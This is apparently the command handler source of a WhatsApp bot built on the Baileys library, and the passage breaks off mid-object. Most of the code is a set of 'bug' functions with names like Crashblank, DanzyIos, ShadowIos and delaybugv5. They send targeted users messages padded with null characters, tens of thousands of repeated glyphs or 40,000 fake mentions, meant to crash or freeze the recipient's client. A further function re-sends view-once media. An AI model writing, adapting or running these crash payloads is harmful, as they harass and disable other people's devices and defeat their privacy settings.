require('./settings');
const fs = require('fs');
const { modul } = require('./module')
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const crypto = require('crypto');
const chalk = require("chalk");
const util = require("util");
const archiver = require('archiver');
const yts = require('yt-search');
const FormData = require('form-data');
const { Client } = require('ssh2');
const moment = require("moment-timezone");
const speed = require('performance-now');
const JsConfuser = require('js-confuser');
const similarity = require('similarity');
const { spawn, exec, execSync } = require('child_process');
const sendSticker = require('./lib/sendSticker');
const { fromBuffer } = require('file-type');
const sharp = require('sharp');
const fetch = require('node-fetch');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./lib/converter.js")
const { imageToWebp } = require('./lib/scraper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./lib/function');

const { default: 
baileys, 
proto, 
generateWAMessage, 
generateWAMessageFromContent, 
getContentType, 
prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = danzy = async (danzy, m, chatUpdate, store) => {
try {
// Message type handlers
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? danzy.user.id.split(":")[0] || danzy.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';

// Buat Grup
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database And Lain"
const botNumber = await danzy.decodeJid(danzy.user.id);
const isBot = botNumber.includes(senderNumber)
const ownerbot = JSON.parse(fs.readFileSync("./lib/Database/owner.json"))
const isOwner = ownerbot.includes(sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const isPc = from.endsWith('@s.whatsapp.net')

// function Group
const groupMetadata = isGroup ? await danzy.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.Danzyganteng : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')


        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
       

// My Func
const { 
smsg, 
sendGmail, 
formatSize, 
isUrl, 
generateMessageTag, 
getBuffer, 
getSizeMedia, 
runtime, 
fetchJson, 
formatp,
getTime,
getRandom,
sleep } = require('./lib/myfunc');

// fungsi waktu real time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

const DanzyDevStickSc = () => {
        let DanzyDevStikRep = fs.readFileSync('./sticker-replydanzy-sc/sc.webp')
        danzy.sendMessage(from, { sticker: DanzyDevStikRep }, { quoted: m })
        }  

const replydanzy = (teks) => {
    danzy.sendMessage(m.chat, { 
        text: teks,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                containsAutoReply: true,
                title: global.title,
                previewType: "PHOTO",
                thumbnailUrl: global.image.Reply,
                thumbnail: `https://files.catbox.moe/nsle74.jpg`,
                sourceUrl: global.website
            }
        }
    }, { quoted: m });
}      


// Cmd in Console
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`➤ New Messages`));
console.log(
chalk.bgHex("#00FF00").black(
` ╭─ > Tanggal: ${new Date().toLocaleString()} \n` +
` ├─ > Pesan: ${m.body || m.mtype} \n` +
` ├─ > Pengirim: ${m.pushname} \n` +
` ╰─ > JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
` ╭─ > Grup: ${groupName} \n` +
` ╰─ > GroupJid: ${m.chat}`
)
);
}
console.log();
}

//==========================================//
const { os, baileys, child_process, crypto, cookie,  fetch, process, ms, speed, syntaxerror, nodecron } = modul
//==========================================//

//==========================================//   
const userSessions = {};
//==========================================//    
const cursor = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: ""
},
message: {
buttonsMessage: {
hasMediaAttachment: true,
contentText: `私はあなたが好き`,
footerText: ``,
buttons: [
{ buttonId: "\u0000".repeat(749999), buttonText: { displayText: "DapzInHere" }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }
], 
viewOnce: true,
headerType: 1
}
}, 
contextInfo: {
virtexId: danzy.generateMessageTag(),
participant: "0@s.whatsapp.net",
mentionedJid: ["0@s.whatsapp.net"],
}, 
};

//======================================//

async function uploadToCatbox(fileBuffer, fileName) {
    try {
        const form = new FormData();
        form.append('reqtype', 'fileupload'); // Parameter wajib
        form.append('userhash', ''); // Bisa dikosongkan jika tidak punya akun Catbox
        form.append('fileToUpload', fileBuffer, fileName); // File yang akan diunggah

        const response = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: {
                ...form.getHeaders(),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', // Tambahkan User-Agent
            },
        });

        console.log('Catbox Response:', response.data); // Debugging untuk melihat hasil dari API

        if (response.data.startsWith('https://files.catbox.moe/')) {
            return response.data; // URL hasil upload
        } else {
            throw new Error('Upload gagal: ' + response.data);
        }
    } catch (error) {
        console.error('Error upload ke Catbox:', error.message);
        return null;
    }
}

// === Fungsi Utama untuk Membaca View Once ===
async function readViewOnceMessage(m, danzy, reply, DanzyReply) {
  try {
    if (!m.quoted) return reply("Reply to an image/video that you want to view");

    if (!["viewOnceMessageV2", "viewOnceMessage"].includes(m.quoted.mtype)) 
      return DanzyReply("This is not a view-once message.");

    const msg = m.quoted.message;
    const wrapper = msg?.[Object.keys(msg)[0]];
    const realMessage = wrapper?.message || wrapper;

    if (!realMessage) return DanzyReply("Failed to retrieve the inner message.");

    const mediaType = Object.keys(realMessage)[0];
    const mediaContent = realMessage[mediaType];

    if (!["imageMessage", "videoMessage"].includes(mediaType)) {
      return DanzyReply("The quoted message is not an image or video.");
    }

    const stream = await downloadContentFromMessage(mediaContent, mediaType === "imageMessage" ? "image" : "video");
    const buffer = Buffer.concat(await streamToBuffer(stream));

    const sendPayload = mediaType === "videoMessage"
      ? { video: buffer, caption: mediaContent.caption || "" }
      : { image: buffer, caption: mediaContent.caption || "" };

    await danzy.sendMessage(m.chat, sendPayload);
    await danzy.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

  } catch (err) {
    console.error("Error in readViewOnceMessage:", err);
    DanzyReply("Failed to read the view-once message.");
  }
}

//======================================//
async function protocobug5(target, mention) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from(
      { length: 40000 },
      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".#DEITONA⚔️" + "ោ៝".repeat(10000),
    title: "Apocalypse",
    artworkDirectPath:
      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "289511",
    seconds: 15,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "jaja",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      isSampled: true,
      mentionedJid: mentionedList,
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363334766163982@newsletter",
      serverMessageId: 1,
      newsletterName: "χඞ",
    },
    streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic,
        },
        embeddedAction: true,
      },
    ],
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: { videoMessage },
      },
    },
    {}
  );

  await danzy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await danzy.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function delaybugv5(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "..#DEITONA⚔️¡?" + "ោ៝".repeat(10000),
        title: "Apocalypse",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𝚡𝚊𝚝𝚊𝚋𝚞𝚐𝚜",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363334766163982@newsletter",
            serverMessageId: 1,
            newsletterName: "χඞ"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await danzy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await danzy.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
//═══════════════ FUNC FC BETA ═════════════════//
async function carouselNew(target) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "\u0000".repeat(10000),
          "body": "\u0000".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "Xmods System ☠️" + "ꦾ".repeat(22000)
        },
        "footer": {
          "text": "dont panic!!"
        },
        "header": { 
          "title": 'memekk' + "\u0000".repeat(50000),
          "hasMediaAttachment": true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(target, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "Xmods System ☠️ " + "ꦾ".repeat(55000)
            },
            "footer": {
              "text": "( 🐉 ) Xmods System ☠️  ( 🐉 )"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await danzy.relayMessage(target, carousel.message, {
      messageId: carousel.key.id
    });
    console.log("Xmods Sending Carousel New !!");
  }
}
//============ FUNC BLANK ===============//
async function Crashblank(target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "© XMODS INFINITY v2" + "ោ៝".repeat(10000),
      caption: "© XMODS INFINITY v2" + "ោ៝".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await danzy.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}

async function bugdanzy4(target) {
  await danzy.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "PROPOVERS",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function bugdanzy2(target) {
  await danzy.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "OS",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function bugdanzy3(target) {
  danzy.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "ꦾ".repeat(55000),
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "© XMODS INFINITY v2" + "ꦾ࣯࣯".repeat(50000),
          },
disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      paymentInviteMessage: {
        serviceType: "PROPOVERS",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}

async function invicXblank(target) {
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "© XMODS INFINITY v2" + "ោ៝".repeat(10000),
      caption: "© XMODS INFINITY v2" + "ោ៝".repeat(10000),
      jpegThumbnail: null
    }
  };
  await danzy.relayMessage(target, msg, {
  participant: { jid: target }, 
  messageId: null
  })
}

async function Blankhard(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await danzy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

//================== FUNC IOS =====================//
async function DanzyIos(target) {
                   try {
                           const IphoneCrash = "𑇂𑆵𑆴𑆿".repeat(60000);
                           await danzy.relayMessage(target, {
                                   locationMessage: {
                                           degreesLatitude: 11.11,
                                           degreesLongitude: -11.11,
                                           name: "iOs Crash          " + IphoneCrash,
                                           url: "https://youtube.com/@yatim"
                                   }
                           }, {
                                   participant: {
                                           jid: target
                                   }
                           });
                           console.log("Send Bug By satria invis ios");
                   } catch (error) {
                           console.error("Error Sending Bug:", error);
                   }
}
async function VenCrash(target) {
  await danzy.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "VENMO",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function ShadowIos(target) {
    const Ganteng = "_*~@15056669999~*_\n".repeat(10200);
    const Danzy = "ꦽ".repeat(1500);

    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "Emak Lu Musuh Gua",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Assalamu'alaikum" + Danzy + Ganteng
                    },
                    contextInfo: {
                        mentionedJid: ["15056669999@s.whatsapp.net", ...Array.from({ length: 10000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "https://xnxxx.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await danzy.relayMessage(target, message, { participant: { jid: target } });
}

const sockireKING = {
 key: {
 remoteJid: "p",
 fromMe: false,
 participant: "0@s.whatsapp.net",
 },
 message: {
 interactiveResponseMessage: {
 body: {
 text: "sockire",
 format: "DEFAULT",
 },
 nativeFlowResponseMessage: {
 name: "galaxy_message",
